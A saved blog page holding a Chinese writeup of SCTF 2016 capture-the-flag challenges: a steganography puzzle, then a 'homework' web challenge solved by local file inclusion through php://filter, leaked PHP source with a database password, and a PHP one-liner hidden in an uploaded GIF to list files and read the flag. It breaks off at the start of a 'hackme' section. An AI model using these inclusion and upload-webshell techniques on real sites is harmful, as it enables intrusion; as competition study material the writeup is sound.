@@ -1,0 +1,456 @@
+<!DOCTYPE html>
+
+<html lang="zh-Hans">
+<head>
+<!--[if lt IE 9]>
+        <style>body {display: none; background: none !important} </style>
+        <meta http-equiv="Refresh" Content="0; url=//outdatedbrowser.com/" />
+    <![endif]-->
+<meta charset="utf-8"/>
+<meta content="IE=edge, chrome=1" http-equiv="X-UA-Compatible">
+<meta content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" name="viewport"/>
+<meta content="telephone=no" name="format-detection">
+<meta content="LoRexxar" name="author"/>
+<meta content="周末打了sctf2016，结果遇到了tomato大神的各种渗透题目….大神的脑回路都好长啊，题目都是一层连一层…" name="description"/>
+<meta content="article" property="og:type"/>
+<meta content="sctf2016_writeup" property="og:title"/>
+<meta content="http://lorexxar.cn/2016/05/09/sctf2016/index.html" property="og:url"/>
+<meta content="LoRexxar's Blog" property="og:site_name"/>
+<meta content="周末打了sctf2016，结果遇到了tomato大神的各种渗透题目….大神的脑回路都好长啊，题目都是一层连一层…" property="og:description"/>
+<meta content="http://lorexxar.cn/img/sctf2016/point.png" property="og:image"/>
+<meta content="http://lorexxar.cn/img/sctf2016/misc2.png" property="og:image"/>
+<meta content="http://lorexxar.cn/img/sctf/hcakme1.png" property="og:image"/>
+<meta content="2016-05-10T05:31:02.000Z" property="og:updated_time"/>
+<meta content="summary" name="twitter:card"/>
+<meta content="sctf2016_writeup" name="twitter:title"/>
+<meta content="周末打了sctf2016，结果遇到了tomato大神的各种渗透题目….大神的脑回路都好长啊，题目都是一层连一层…" name="twitter:description"/>
+<meta content="http://lorexxar.cn/img/sctf2016/point.png" name="twitter:image"/>
+<link href="./sctf2016_writeup  LoRexxar's Blog/apple-touch-icon.png" rel="apple-touch-icon"/>
+<link href="./sctf2016_writeup  LoRexxar's Blog/atom.xml" rel="alternate" title="LoRexxar's Blog" type="application/atom+xml"/>
+<link href="./sctf2016_writeup  LoRexxar's Blog/699-14040QPP9.jpg" rel="shortcut icon"/>
+<link href="./sctf2016_writeup  LoRexxar's Blog/jquery.fancybox.min.css" rel="stylesheet"/>
+<script src="./sctf2016_writeup  LoRexxar's Blog/pace.min.js"></script>
+<link href="./sctf2016_writeup  LoRexxar's Blog/pace-theme-minimal.css" rel="stylesheet"/>
+<link href="./sctf2016_writeup  LoRexxar's Blog/style.css" rel="stylesheet"/>
+<link href="./sctf2016_writeup  LoRexxar's Blog/font-awesome.min.css" rel="stylesheet"/>
+<title>sctf2016_writeup | LoRexxar's Blog</title>
+<script src="./sctf2016_writeup  LoRexxar's Blog/jquery.min.js"></script>
+<script src="./sctf2016_writeup  LoRexxar's Blog/clipboard.min.js"></script>
+<script>
+    var yiliaConfig = {
+        fancybox: true,
+        animate: false,
+        isHome: false,
+        isPost: true,
+        isArchive: false,
+        isTag: false,
+        isCategory: false,
+        fancybox_js: "//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.js",
+        scrollreveal: "//cdn.bootcss.com/scrollReveal.js/3.1.4/scrollreveal.min.js",
+        search: true
+    }
+</script>
+<script>
+        yiliaConfig.jquery_ui = [true, "//cdn.bootcss.com/jqueryui/1.10.4/jquery-ui.min.js", "//cdn.bootcss.com/jqueryui/1.10.4/css/jquery-ui.min.css"];
+    </script>
+<script> yiliaConfig.rootUrl = "\/";</script>
+<script>
+        var _hmt = _hmt || [];
+        (function() {
+            var hm = document.createElement("script");
+            hm.src = "//hm.baidu.com/hm.js?736cd32ff67d23a009e16622fd600527";
+            var s = document.getElementsByTagName("script")[0]; 
+            s.parentNode.insertBefore(hm, s);
+        })();
+    </script>
+</meta></meta></head>
+<body>
+<div id="container">
+<div class="left-col">
+<div class="overlay"></div>
+<div class="intrude-less">
+<header class="inner" id="header">
+<a class="profilepic" href="/">
+<img class="animated zoomIn" src="./sctf2016_writeup  LoRexxar's Blog/699-14040QPP9.jpg"/>
+</a>
+<hgroup>
+<h1 class="header-author"><a href="/">LoRexxar</a></h1>
+</hgroup>
+<p class="header-subtitle">带着对技术的敬畏之心成长，不安于一隅...</p>
+<form id="search-form">
+<input autocomplete="off" autocorrect="off" class="search form-control" id="local-search-input" name="q" placeholder="search..." searchonload="false" type="text"/>
+<i class="fa fa-times" onclick="resetSearch()"></i>
+</form>
+<div id="local-search-result"></div>
+<p class="no-result">No results found <i class="fa fa-spinner fa-pulse"></i></p>
+<div class="switch-btn" id="switch-btn">
+<div class="icon">
+<div class="icon-ctn">
+<div class="icon-wrap icon-house" data-idx="0">
+<div class="birdhouse"></div>
+<div class="birdhouse_holes"></div>
+</div>
+<div class="icon-wrap icon-ribbon hide" data-idx="1">
+<div class="ribbon"></div>
+</div>
+<div class="icon-wrap icon-link hide" data-idx="2">
+<div class="loopback_l"></div>
+<div class="loopback_r"></div>
+</div>
+<div class="icon-wrap icon-me hide" data-idx="3">
+<div class="user"></div>
+<div class="shoulder"></div>
+</div>
+</div>
+</div>
+<div class="tips-box hide">
+<div class="tips-arrow"></div>
+<ul class="tips-inner">
+<li>菜单</li>
+<li>标签</li>
+<li>友情链接</li>
+<li>关于我</li>
+</ul>
+</div>
+</div>
+<div class="switch-area" id="switch-area">
+<div class="switch-wrap">
+<section class="switch-part switch-part1">
+<nav class="header-menu">
+<ul>
+<li><a href="/">主页</a></li>
+<li><a href="/archives/">所有文章</a></li>
+<li><a href="/tags/">标签云</a></li>
+<li><a href="/about/">关于我</a></li>
+</ul>
+</nav>
+<nav class="header-nav">
+<ul class="social">
+<a class="fa Email" href="/lorexxar@gmail.com" title="Email"></a>
+<a class="fa 新浪微博" href="/强行被换号的LoRexxar" title="新浪微博"></a>
+<a class="fa GitHub" href="https://github.com/LoRexxar" title="GitHub"></a>
+<a class="fa RSS" href="/atom.xml" title="RSS"></a>
+<a class="fa 知乎" href="https://www.zhihu.com/people/romor-rexxar" title="知乎"></a>
+</ul>
+</nav>
+</section>
+<section class="switch-part switch-part2">
+<div class="widget tagcloud" id="js-tagcloud">
+<ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/0day/">0day</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Blogs/">Blogs</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CBC/">CBC</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Essay/">Essay</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Essry/">Essry</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Hexo/">Hexo</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/IPC通道入侵/">IPC通道入侵</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/LD-PRELOAD/">LD_PRELOAD</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/LFI/">LFI</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/RSA/">RSA</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Reprint/">Reprint</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Shadow-Brokers/">Shadow Brokers</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/access/">access</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/book-notes/">book_notes</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/bookshelf/">bookshelf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/c/">c</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/cloudeye/">cloudeye</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/cmd/">cmd</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/crontab/">crontab</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/crypto/">crypto</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/csp/">csp</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/csrf/">csrf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf/">ctf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/curl/">curl</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/cve/">cve</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/dns/">dns</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/docker/">docker</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/eassy/">eassy</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/fastcgi/">fastcgi</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/fcgi/">fcgi</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/file-put-contents/">file_put_contents</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/flask/">flask</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/game/">game</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/git/">git</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/gopher/">gopher</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/hctf/">hctf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/injection/">injection</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/lcx端口转发/">lcx端口转发</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/lfi/">lfi</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/linux/">linux</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/misc/">misc</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/msf/">msf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/opcache/">opcache</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pdflatex/">pdflatex</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/php/">php</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/php-opcache/">php opcache</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/phpmailer/">phpmailer</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/php伪协议/">php伪协议</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pwn/">pwn</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pwnhub/">pwnhub</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python/">python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/rabins/">rabins</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/redis/">redis</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/sangebaimao/">sangebaimao</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/shell/">shell</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/sqli/">sqli</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/sqlmap/">sqlmap</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ssh-sock5/">ssh_sock5</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ssrf/">ssrf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/titan-souls/">titan_souls</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/tqdm/">tqdm</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/virtualenv/">virtualenv</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/weblogic/">weblogic</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/wget/">wget</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/win-server信息收集/">win server信息收集</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/windows/">windows</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/xss/">xss</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/伪协议/">伪协议</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/参数污染/">参数污染</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/格式化字符串/">格式化字符串</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/模板注入/">模板注入</a></li></ul>
+</div>
+</section>
+<section class="switch-part switch-part3">
+<div id="js-friends">
+<a class="main-nav-link switch-friends-link" href="https://coding.net/u/LoRexxar">Coding</a>
+<a class="main-nav-link switch-friends-link" href="https://github.com/LoRexxar">GitHub</a>
+<a class="main-nav-link switch-friends-link" href="http://hduisa.cn">HDUISA</a>
+<a class="main-nav-link switch-friends-link" href="https://wiki.hduisa.cn">HDUISA_wiki</a>
+<a class="main-nav-link switch-friends-link" href="https://lightless.me/">lightless</a>
+<a class="main-nav-link switch-friends-link" href="http://lazysheep.cc">Hcamael</a>
+<a class="main-nav-link switch-friends-link" href="http://aklis.info/">Aklis</a>
+<a class="main-nav-link switch-friends-link" href="http://libc.pw/">zh_explorer</a>
+<a class="main-nav-link switch-friends-link" href="http://edwardl.xyz/">Edward_L</a>
+<a class="main-nav-link switch-friends-link" href="http://evilddog.space/">evilddog</a>
+<a class="main-nav-link switch-friends-link" href="http://www.venenof.com/">Veneno</a>
+<a class="main-nav-link switch-friends-link" href="http://www.nohackair.net/">Airbasic</a>
+<a class="main-nav-link switch-friends-link" href="https://loli.be/">Mashiro</a>
+<a class="main-nav-link switch-friends-link" href="http://www.codersec.net/">bsmali4</a>
+<a class="main-nav-link switch-friends-link" href="/www.bertramc.cn">berTrAM</a>
+</div>
+</section>
+<section class="switch-part switch-part4">
+<div id="js-aboutme">带着对技术的敬畏之心成长，不安于一隅...</div>
+</section>
+</div>
+</div>
+</header>
+</div>
+</div>
+<div class="mid-col">
+<nav id="mobile-nav">
+<div class="overlay">
+<div class="slider-trigger"></div>
+<h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页">LoRexxar</a></h1>
+</div>
+<div class="intrude-less">
+<header class="inner" id="header">
+<a class="profilepic" href="/">
+<img class="animated zoomIn" src="./sctf2016_writeup  LoRexxar's Blog/699-14040QPP9.jpg"/>
+</a>
+<hgroup>
+<h1 class="header-author"><a href="/" title="回到主页">LoRexxar</a></h1>
+</hgroup>
+<p class="header-subtitle">带着对技术的敬畏之心成长，不安于一隅...</p>
+<nav class="header-menu">
+<ul>
+<li><a href="/">主页</a></li>
+<li><a href="/archives/">所有文章</a></li>
+<li><a href="/tags/">标签云</a></li>
+<li><a href="/about/">关于我</a></li>
+<div class="clearfix"></div>
+</ul>
+</nav>
+<nav class="header-nav">
+<ul class="social">
+<a class="fa Email" href="/lorexxar@gmail.com" target="_blank" title="Email"></a>
+<a class="fa 新浪微博" href="/强行被换号的LoRexxar" target="_blank" title="新浪微博"></a>
+<a class="fa GitHub" href="https://github.com/LoRexxar" target="_blank" title="GitHub"></a>
+<a class="fa RSS" href="/atom.xml" target="_blank" title="RSS"></a>
+<a class="fa 知乎" href="https://www.zhihu.com/people/romor-rexxar" target="_blank" title="知乎"></a>
+</ul>
+</nav>
+</header>
+</div>
+<link about="关于我" class="menu-list" friends="友情链接" tags="标签">
+</link></nav>
+<div class="body-wrap"><article class="article article-type-post" id="post-sctf2016" itemprop="blogPost" itemscope="">
+<div class="article-meta">
+<a class="article-date" href="/2016/05/09/sctf2016/">
+<time datetime="2016-05-09T07:56:54.000Z" itemprop="datePublished">2016-05-09</time>
+</a>
+</div>
+<div class="article-inner">
+<input class="isFancy" type="hidden"/>
+<header class="article-header">
+<h1 class="article-title" itemprop="name">
+      sctf2016_writeup
+    </h1>
+</header>
+<div class="article-info article-info-post">
+<div class="article-category tagcloud">
+<a class="article-category-link" href="/categories/Blogs/">Blogs</a>
+</div>
+<div class="article-tag tagcloud">
+<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Blogs/">Blogs</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/">ctf</a></li></ul>
+</div>
+<div class="clearfix"></div>
+</div>
+<div class="article-entry" itemprop="articleBody">
+<p>周末打了sctf2016，结果遇到了tomato大神的各种渗透题目….大神的脑回路都好长啊，题目都是一层连一层…<br/><img alt="" src="./sctf2016_writeup  LoRexxar's Blog/point.png"/></p>
+<a id="more"></a>
+<h1 id="MISC"><a class="headerlink" href="#MISC" title="MISC"></a>MISC</h1><h2 id="神秘代码"><a class="headerlink" href="#神秘代码" title="神秘代码"></a>神秘代码</h2><p>讲个故事，叫做神秘代码。</p>
+<p>打开故事的目录….<br/>大兄弟，真车啊<del>~</del>~一颗赛艇</p>
+<p>稍微试了一下发现没什么收货，用foremost拆出来一个r.zip，结果主办方说没关系…</p>
+<p>后来给出一个提示</p>
+<p><strong>神秘代码_hint stegdetect</strong></p>
+<p>那就下这个软件吧，搞了1天都没搞定，结果换个人换个linux就下好了，跑出来是JPhide，那么搜搜看吧</p>
+<p><a href="http://linux01.gwdg.de/~alatham/stego.html" rel="external" target="_blank">http://linux01.gwdg.de/~alatham/stego.html</a></p>
+<p>从这里可以搞到windows版的JPhide解密工具，打开用空密码就可以解出来了<br/><img alt="" src="./sctf2016_writeup  LoRexxar's Blog/misc2.png"/></p>
+<h1 id="PENTEST"><a class="headerlink" href="#PENTEST" title="PENTEST"></a>PENTEST</h1><p>渗透的水平还不够高，后面看到别的wp会再慢慢补回来…</p>
+<h2 id="homework"><a class="headerlink" href="#homework" title="homework"></a>homework</h2><p>进去看到是一个学生的作业系统，稍微翻翻发现一个重要的地方<br/><strong><a href="http://homework.sctf.xctf.org.cn/homework.php?homework=homework.txt" rel="external" target="_blank">http://homework.sctf.xctf.org.cn/homework.php?homework=homework.txt</a></strong><br/>存在本地文件包含漏洞，先读源码回来吧<br/><strong><a href="http://homework.sctf.xctf.org.cn/homework.php?homework=php://filter/read=convert.base64-encode/resource=homework.php" rel="external" target="_blank">http://homework.sctf.xctf.org.cn/homework.php?homework=php://filter/read=convert.base64-encode/resource=homework.php</a></strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">session_start();</div><div class="line">include(&amp;apos;./config.php&amp;apos;);</div><div class="line">@$username=$_POST[&amp;apos;username&amp;apos;];</div><div class="line">@$password=$_POST[&amp;apos;password&amp;apos;];</div><div class="line">@include($_GET[&amp;apos;homework&amp;apos;]);</div><div class="line">$username=intval($username);</div><div class="line">$password=md5($password);</div><div class="line">$result=mysql_query("select * from info where username=&amp;apos;$username&amp;apos;&amp;&amp;password=&amp;apos;$password&amp;apos;");</div><div class="line">$row=mysql_fetch_array($result);</div><div class="line">if(empty($row))</div><div class="line">{</div><div class="line">	print("Ã»ÓÐ¸ÃÑ§Éú»òÕßÃÜ ë´íÁËÒ²ÓÐ¿ÉÄÜÊÇÄãµÄÑ§ºÅ´íÁË.....×ÜÖ®ÓÐÊ²Ã´µØ·½´íÁË¡£");</div><div class="line">	exit();</div><div class="line">}else</div><div class="line">{</div><div class="line">	$_SESSION[&amp;apos;login&amp;apos;]=1;</div><div class="line">	$_SESSION[&amp;apos;xuehao&amp;apos;]=$row[&amp;apos;username&amp;apos;];</div><div class="line">	header("Location: ./homework.php");</div></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">&lt;html&gt;</div><div class="line">&lt;meta http-equiv="Content-Type" content="text/html;charset=UTF-8"&gt;</div><div class="line">&lt;/html&gt;</div><div class="line">&lt;?php</div><div class="line">session_start();</div><div class="line">if($_SESSION[&amp;apos;login&amp;apos;]!=1){</div><div class="line">	exit(&amp;apos;Plz Login&amp;apos;);</div><div class="line">}</div><div class="line">if(preg_match(&amp;apos;/^read/&amp;apos;,$_GET[&amp;apos;homework&amp;apos;]))</div><div class="line">{</div><div class="line">exit(&amp;apos;Plz Don\&amp;apos;t read my code&amp;apos;);</div><div class="line">}</div><div class="line">@include($_GET[&amp;apos;homework&amp;apos;]);</div><div class="line">include(&amp;apos;./config.php&amp;apos;);</div><div class="line">$result=mysql_query("select * from info where username=&amp;apos;$_SESSION[xuehao]&amp;apos;");</div><div class="line">$row=mysql_fetch_array($result);</div><div class="line">echo "Welcome".$row[&amp;apos;name&amp;apos;]."&lt;/B&gt;to Homework Center.&lt;br /&gt;";</div><div class="line">echo "&lt;img src=&amp;apos;".$row[&amp;apos;pic&amp;apos;]."&amp;apos;&gt;&lt;br /&gt;";</div><div class="line">echo "&lt;a href=&amp;apos;./homework.php?homework=homework.txt&amp;apos;&gt;homework&lt;/a&gt;";</div></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div></pre></td><td class="code"><pre><div class="line">&lt;html&gt;</div><div class="line">&lt;meta http-equiv="Content-Type" content="text/html;charset=UTF-8"&gt;</div><div class="line">&lt;/html&gt;</div><div class="line">&lt;?php</div><div class="line">include(&amp;apos;./config.php&amp;apos;);</div><div class="line">session_start();</div><div class="line">function make_password()</div><div class="line">{</div><div class="line">	$password="";</div><div class="line">	$chars="abcdefghijklmnopqrstuvwxyz1234567890-=!@#$%^&amp;*_";</div><div class="line">	for($i=0;$i&lt;8;$i++)</div><div class="line">	{</div><div class="line">		$password.=$chars[rand(0,46)];</div><div class="line">	}</div><div class="line">	return $password;</div><div class="line">}</div><div class="line"></div><div class="line">if(isset($_POST[&amp;apos;captcha_code&amp;apos;])){</div><div class="line">	// code for check server side validation</div><div class="line">	if(empty($_SESSION[&amp;apos;captcha_code&amp;apos;] ) || strcasecmp($_SESSION[&amp;apos;captcha_code&amp;apos;], $_POST[&amp;apos;captcha_code&amp;apos;]) != 0){  </div><div class="line">		 exit(&amp;apos;éªè¯ç éè¯¯&amp;apos;);</div><div class="line">	}else{// Captcha verification is Correct. Final Code Execute here!		</div><div class="line">		</div><div class="line">	}</div><div class="line">}</div><div class="line">if(isset($_POST[&amp;apos;upload&amp;apos;])){</div><div class="line">$filename = $_FILES[&amp;apos;uploaded&amp;apos;][&amp;apos;name&amp;apos;];</div><div class="line">$filetype = $_FILES[&amp;apos;uploaded&amp;apos;][&amp;apos;type&amp;apos;];</div><div class="line">$filesize = $_FILES[&amp;apos;uploaded&amp;apos;][&amp;apos;size&amp;apos;];</div><div class="line">$tmpname = $_FILES[&amp;apos;uploaded&amp;apos;][&amp;apos;tmp_name&amp;apos;];</div><div class="line">$uploaddir = &amp;apos;./upload/&amp;apos;;</div><div class="line">$target_path = $uploaddir.basename($filename);</div><div class="line">$fileext = substr(strrchr($filename,"."),1);</div><div class="line">if(($fileext == &amp;apos;gif&amp;apos;)&amp;&amp;($filetype == "image/gif")){</div><div class="line">	{</div><div class="line">		if(move_uploaded_file($tmpname,$target_path))</div><div class="line">		{</div><div class="line">		}</div><div class="line">	}</div><div class="line">	$im =imagecreatefromgif($target_path);</div><div class="line">	srand(time());</div><div class="line">	$newfilename = strval(rand()).".gif";</div><div class="line">	$newimagepath = $uploaddir.$newfilename;</div><div class="line">	imagegif($im,$newimagepath);</div><div class="line">	unlink($target_path);</div><div class="line">}else if(($fileext == &amp;apos;jpg&amp;apos;)&amp;&amp;($filetype == "image/jpeg"))</div><div class="line">{</div><div class="line">	if(move_uploaded_file($tmpname,$target_path))</div><div class="line">		{</div><div class="line">		}</div><div class="line">	$im =imagecreatefromjpeg($target_path);</div><div class="line">	srand(time());</div><div class="line">	$newfilename = strval(rand()).".jpg";</div><div class="line">	$newimagepath = $uploaddir.$newfilename;</div><div class="line">	imagejpeg($im,$newimagepath);</div><div class="line">	unlink($target_path);</div><div class="line">}else if (($fileext==&amp;apos;png&amp;apos;)&amp;&amp;($filetype=="image/png"))</div><div class="line">{</div><div class="line">	if(move_uploaded_file($tmpname,$target_path))</div><div class="line">		{</div><div class="line">		}</div><div class="line">	$im =imagecreatefromjpeg($target_path);</div><div class="line">	srand(time());</div><div class="line">	$newfilename = strval(rand()).".png";</div><div class="line">	$newimagepath = $uploaddir.$newfilename;</div><div class="line">	imagejpeg($im,$newimagepath);</div><div class="line">	unlink($target_path);</div><div class="line">}</div><div class="line">}</div><div class="line">if(isset($_POST[&amp;apos;name&amp;apos;])&amp;&amp;isset($_POST[&amp;apos;age&amp;apos;]))</div><div class="line">{</div><div class="line">	$name=substr($_POST[&amp;apos;name&amp;apos;],0,6);</div><div class="line">	$age=intval($_POST[&amp;apos;age&amp;apos;]);</div><div class="line">	$username=file_get_contents(&amp;apos;./id.txt&amp;apos;);</div><div class="line">	$password=make_password();</div><div class="line">	file_put_contents(&amp;apos;./id.txt&amp;apos;,intval($username)+1);</div><div class="line">	mysql_query("insert into info(username,password,name,pic,age)values(&amp;apos;$username&amp;apos;,md5(&amp;apos;$password&amp;apos;),&amp;apos;$name&amp;apos;,&amp;apos;$newimagepath&amp;apos;,$age)");</div><div class="line">	mysql_close($con);</div><div class="line">	print("çææåï¼å­¦å·:$username,å¯ç ï¼$password");</div><div class="line">	print("&lt;a href=&amp;apos;./index.html&amp;apos;&gt;åä¸»é¡µ&lt;/a&gt;");</div><div class="line">}</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">	$db_user=&amp;apos;web&amp;apos;;</div><div class="line">	$db_password=&amp;apos;WebPaSSw0rd!&amp;apos;;</div><div class="line">	$db_host=&amp;apos;localhost&amp;apos;;</div><div class="line">	$db_database=&amp;apos;web&amp;apos;;</div><div class="line">	$con =mysql_connect($db_host,$db_user,$db_password) or die(&amp;apos;Not connect&amp;apos;);</div><div class="line">	mysql_select_db($db_database,$con) or dir(&amp;apos;Not select&amp;apos;);</div><div class="line">	mysql_query(&amp;apos;SET NANES UTF8&amp;apos;);</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
+<p>稍微研究一下源码发现name存在注入，但是只有6位，所以没什么用。<br/>那就是上传文件的地方有问题了，测试一下发现重点在于这两个函数<code>imagecreatefromjpeg</code><br/><code>imagecreatefromgif</code></p>
+<p>发现这两个函数会把图片做处理，如果图片是不可解析的，那么直接回返回false不会写进文件中去。那么应该就是构造一个图片shell了</p>
+<p>做题时开始踩了坑，因为发现这个函数会把图片中的内容重构过，所以直接写shell失败，所以试图写在不会被处理的地方，所以发现了这篇文章<a href="https://www.secgeek.net/bookfresh-vulnerability/" rel="external" target="_blank">https://www.secgeek.net/bookfresh-vulnerability/</a></p>
+<p>蛋疼的是线上无效（后来发现其实phpInfo()其实被删了），然后找别的办法，尝试使用gif</p>
+<p>测试发现gif的处理不像jpg那么严格，几乎没有对图片的重构，所以在图片的前面在不影响内容的情况下写入了一句话。</p>
+<p>然后列目录读文件就get flag了<br/><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">a=<span class="built_in">echo</span> <span class="string">"&lt;br /&gt;"</span>;<span class="variable">$handler</span> = opendir(<span class="string">'./'</span>);<span class="keyword">while</span>( (<span class="variable">$filename</span> = readdir(<span class="variable">$handler</span>)) !== <span class="literal">false</span> ) {<span class="built_in">echo</span> <span class="variable">$filename</span>.<span class="string">"&lt;br/&gt;"</span>;}<span class="variable">$username</span>=file_get_contents(<span class="string">'./4ff692fb12aa996e27f0a108bfc386c2'</span>);var_dump(<span class="variable">$username</span>);</div></pre></td></tr></table></figure></p>
+<h2 id="hackme"><a class="headerlink" href="#hackme" title="hackme"></a>hackme</h2><p>题目刚出的时候没去看，后来发现给了一大堆提示<br/><strong>Hackme提示</strong><br/><strong>1.网站开发人员经常会去看备忘录</strong><br/><strong>2.想办法拿到管理员密码</strong></p>
